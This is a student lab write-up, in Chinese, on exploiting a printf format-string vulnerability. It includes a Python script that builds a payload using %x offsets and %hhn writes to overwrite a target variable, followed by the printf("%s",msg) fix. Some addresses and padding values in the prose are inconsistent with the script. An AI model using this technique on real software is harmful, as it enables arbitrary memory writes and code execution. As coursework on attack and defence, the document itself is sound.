任务 三

A

target的地址是0x080e5068 把target地址放在buffer的第1000位，随后前面放很多个%x，随后逐渐减少%x的个数 测得314个%x可以刚好读到target地址 因此构建313个%x和1个%n 成功修改target

B

0x062d比0x5000少0x49d3（18899），因此多输出18899个字符就行，用%0.18890x实现

C

将修改拆分为aa bb cc dd，使用%hhn实现 四个地址分别为0x0805068/0x0805069/0x080506a/0x0805068b

#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number1  = 0x080e506b
content[1000:1004]  =  (number1).to_bytes(4,byteorder='little')
number2  = 0x080e506a
content[1008:1012]  =  (number2).to_bytes(4,byteorder='little')
number3  = 0x080e5069
content[1016:1020]  =  (number3).to_bytes(4,byteorder='little')
number4  = 0x080e5068
content[1024:1028]  =  (number4).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%x" * 312 + "%326d" + "%hhn" + "%273d" + "%hhn" + "%273d" + "%hhn" + "%273d" + "%hhn"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[0:len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

修改成功

任务 六

将变量 msg 直接作为 printf 的格式字符串，而不是当作普通输出内容。这意味着一旦 msg 中包含 %n、%s 等格式符，程序就会错误地将其解释为指令去读取或写入内存，从而引发崩溃或代码执行。 修改为printf("%s",msg); 编译后不报错，攻击也不生效。
